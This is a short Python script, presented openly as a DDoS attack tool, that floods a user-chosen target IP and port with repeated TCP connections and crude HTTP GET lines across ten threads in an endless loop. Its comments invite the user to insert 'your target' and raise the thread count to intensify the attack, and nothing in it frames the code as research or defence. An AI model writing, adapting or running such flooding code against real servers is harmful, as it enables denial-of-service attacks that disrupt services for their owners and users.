import socket
import threading

target_ip = "Enter_Target_IP_Here"  # Replace with the IP address of your target 
target_port = 80  # Replace with the port number of your target

# Function to perform the DDoS attack
def ddos_attack():
    while True:
        try:
            # Create a socket connection to the target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            
            # Send a request to the target
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
            
            # Close the connection
            s.close()
        
        except socket.error:
            # Handle any socket errors
            print("Socket error occurred.")

# Set up multiple threads to intensify the attack
for i in range(10):  # You can adjust the number of threads based on your preference
    thread = threading.Thread(target=ddos_attack)
    thread.start()